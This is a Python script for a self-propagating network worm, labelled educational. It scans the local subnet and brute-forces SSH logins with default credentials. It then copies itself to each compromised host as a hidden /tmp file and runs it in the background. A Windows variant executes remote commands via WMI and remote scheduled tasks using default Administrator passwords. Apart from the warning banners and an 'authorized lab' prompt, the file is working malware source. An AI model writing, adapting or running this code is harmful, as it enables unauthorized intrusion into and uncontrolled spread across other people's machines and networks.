#!/usr/bin/env python3
"""
SIMPLE NETWORK WORM - Shortened Version
⚠️ FOR EDUCATIONAL PURPOSES ONLY - DO NOT USE WITHOUT AUTHORIZATION
"""

import socket
import subprocess
import threading
import time
import os
import random

try:
    import paramiko
except ImportError:
    print("❌ Install paramiko: pip3 install paramiko")
    exit(1)


class SimpleNetworkWorm:
    """Basic SSH-based network worm"""
    
    def __init__(self):
        self.credentials = [
            ('root', 'root'), ('admin', 'admin'), ('pi', 'raspberry'),
            ('ubuntu', 'ubuntu'), ('user', 'password'), ('admin', '1234'),
        ]
        self.infected_hosts = []
    
    def get_local_network(self):
        """Find local network to scan"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            network = '.'.join(local_ip.split('.')[:-1]) + '.'
            print(f"[+] Scanning network: {network}0/24")
            return network
        except:
            return "192.168.1."
    
    def find_alive_hosts(self, network):
        """Scan network for online hosts"""
        print("[*] Scanning for alive hosts...")
        alive_hosts = []
        
        def check_host(ip):
            try:
                result = subprocess.run(['ping', '-c', '1', '-W', '1', ip],
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
                if result.returncode == 0:
                    print(f"[+] Found: {ip}")
                    alive_hosts.append(ip)
            except:
                pass
        
        threads = [threading.Thread(target=check_host, args=(f"{network}{i}",)) for i in range(1, 51)]
        for t in threads: t.start()
        for t in threads: t.join()
        
        print(f"[+] Found {len(alive_hosts)} alive hosts")
        return alive_hosts
    
    def check_port(self, ip, port):
        """Check if port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def try_to_hack(self, ip):
        """Try SSH brute force"""
        if not self.check_port(ip, 22):
            return None
        
        print(f"[*] Trying {ip}...")
        for username, password in self.credentials:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, username=username, password=password, timeout=3, banner_timeout=3)
                print(f"[+++] HACKED {ip} with {username}:{password}")
                return {'ip': ip, 'username': username, 'password': password, 'ssh': ssh}
            except paramiko.AuthenticationException:
                continue
            except:
                continue
        return None
    
    def display_hello_world(self, ssh, ip):
        """Display message on victim"""
        try:
            ssh.exec_command('wall "Hello World! You\'ve Been Hacked!"')
            ssh.exec_command('DISPLAY=:0 notify-send "HACKED!" "Hello World!" --urgency=critical 2>/dev/null')
            print(f"[+] Message displayed on {ip}")
            return True
        except:
            return False
    
    def spread_worm(self, ssh, ip):
        """Copy worm to victim"""
        try:
            with open(__file__, 'r') as f:
                worm_code = f.read()
            
            remote_path = '/tmp/.worm.py'
            ssh.exec_command(f'cat > {remote_path} << "EOF"\n{worm_code}\nEOF')
            ssh.exec_command(f'chmod +x {remote_path}')
            ssh.exec_command(f'nohup python3 {remote_path} > /dev/null 2>&1 &')
            print(f"[+] Worm spread to {ip}")
        except:
            pass
    
    def infect_host(self, ip):
        """Complete infection process"""
        result = self.try_to_hack(ip)
        if result:
            ssh = result['ssh']
            self.display_hello_world(ssh, ip)
            self.spread_worm(ssh, ip)
            self.infected_hosts.append(result)
            ssh.close()
            return True
        return False
    
    def start(self):
        """Main worm execution"""
        print("\n[*] Starting Simple Network Worm...")
        network = self.get_local_network()
        alive_hosts = self.find_alive_hosts(network)
        
        if not alive_hosts:
            print("[-] No hosts found")
            return
        
        for ip in alive_hosts:
            self.infect_host(ip)
            time.sleep(1)
        
        print(f"\n{'='*60}")
        print(f"Scanned: {len(alive_hosts)} | Infected: {len(self.infected_hosts)}")
        for host in self.infected_hosts:
            print(f"  • {host['ip']} ({host['username']}:{host['password']})")
        print('='*60)


class AdvancedWorm(SimpleNetworkWorm):
    """Worm with CVE vulnerability scanning"""
    
    def __init__(self):
        super().__init__()
        self.vulnerabilities = {
            'CVE-2021-44228': {'name': 'Log4Shell', 'port': 8080},
            'CVE-2017-0144': {'name': 'EternalBlue', 'port': 445},
            'CVE-2021-41773': {'name': 'Apache Traversal', 'port': 80},
        }
    
    def scan_vulnerabilities(self, ip):
        """Scan for known CVEs"""
        found = []
        for cve, info in self.vulnerabilities.items():
            if self.check_port(ip, info['port']):
                print(f"[VULN] {ip}:{info['port']} - Checking {cve}")
                # Simplified detection
                found.append((cve, info))
        return found
    
    def start(self):
        """Enhanced start with vuln scanning"""
        print("\n[*] Starting Advanced Worm (CVE scanner)...")
        network = self.get_local_network()
        alive_hosts = self.find_alive_hosts(network)
        
        if not alive_hosts:
            return
        
        for ip in alive_hosts:
            vulns = self.scan_vulnerabilities(ip)
            for cve, info in vulns:
                print(f"[EXPLOIT] Found {cve} on {ip}")
            self.infect_host(ip)
            time.sleep(1)
        
        print(f"\nInfected: {len(self.infected_hosts)} hosts")


class WindowsSMBWorm(SimpleNetworkWorm):
    """Windows-focused SMB worm"""
    
    def __init__(self):
        super().__init__()
        self.windows_credentials = [
            ('Administrator', ''), ('Administrator', 'Admin123'),
            ('admin', 'admin'), ('admin', 'password'),
        ]
        self.smb_infected = []
    
    def infect_via_wmi(self, ip, username, password):
        """WMI fileless execution"""
        if not self.check_port(ip, 135):
            return False
        
        try:
            ps_payload = 'msg * "Hello World! Hacked via WMI!"'
            wmi_cmd = ['wmic', f'/node:{ip}', f'/user:{username}', f'/password:{password}',
                      'process', 'call', 'create', f'powershell -Command "{ps_payload}"']
            
            result = subprocess.run(wmi_cmd, capture_output=True, text=True, timeout=20)
            if result.returncode == 0 and 'successful' in result.stdout.lower():
                print(f"[WMI] ✓ Infected {ip}")
                return True
        except:
            pass
        return False
    
    def infect_via_schtask(self, ip, username, password):
        """Scheduled task infection"""
        if not self.check_port(ip, 445):
            return False
        
        try:
            task_name = f"Update{random.randint(1000, 9999)}"
            ps_command = 'powershell -Command "msg * \'Hacked via Task!\'"'
            
            task_cmd = ['schtasks', '/create', '/s', ip, '/u', username, '/p', password,
                       '/tn', task_name, '/tr', ps_command, '/sc', 'ONCE', '/st', '00:00', '/f']
            
            result = subprocess.run(task_cmd, capture_output=True, timeout=20)
            if result.returncode == 0:
                subprocess.run(['schtasks', '/run', '/s', ip, '/tn', task_name], capture_output=True, timeout=10)
                print(f"[TASK] ✓ Infected {ip}")
                return True
        except:
            pass
        return False
    
    def infect_windows_host(self, ip):
        """Try multiple Windows infection methods"""
        if not self.check_port(ip, 445):
            return False
        
        methods = [
            ('WMI', self.infect_via_wmi),
            ('Scheduled Task', self.infect_via_schtask),
        ]
        
        for method_name, method_func in methods:
            for username, password in self.windows_credentials:
                try:
                    if method_func(ip, username, password):
                        self.smb_infected.append({
                            'ip': ip, 'method': method_name,
                            'username': username, 'password': password
                        })
                        return True
                except:
                    continue
        return False
    
    def start(self):
        """Start Windows SMB worm"""
        print("\n[*] Starting Windows SMB Worm...")
        network = self.get_local_network()
        alive_hosts = self.find_alive_hosts(network)
        
        if not alive_hosts:
            return
        
        for ip in alive_hosts:
            self.infect_windows_host(ip)
            time.sleep(2)
        
        print(f"\nInfected: {len(self.smb_infected)} Windows hosts")
        for host in self.smb_infected:
            print(f"  • {host['ip']} via {host['method']}")


def main():
    print("""
⚠️⚠️⚠️ WARNING - REAL MALWARE CODE ⚠️⚠️⚠️

Worm types:
1. Simple (SSH brute force)
2. Advanced (CVE exploits + SSH)
3. Windows SMB (WMI + Tasks)
4. Exit (study only)

ONLY RUN IN AUTHORIZED LAB ENVIRONMENTS!
""")
    
    choice = input("Choice (1/2/3/4): ").strip()
    
    if choice == '4':
        print("\n✓ Study the code to understand worm techniques!")
        return
    
    if input("Authorized lab? (yes/no): ").lower() != 'yes':
        print("✓ Good decision!")
        return
    
    print("\n[*] Launching worm...\n")
    
    if choice == '1':
        worm = SimpleNetworkWorm()
    elif choice == '2':
        worm = AdvancedWorm()
    elif choice == '3':
        worm = WindowsSMBWorm()
    else:
        print("Invalid choice")
        return
    
    worm.start()


if __name__ == "__main__":
    main()
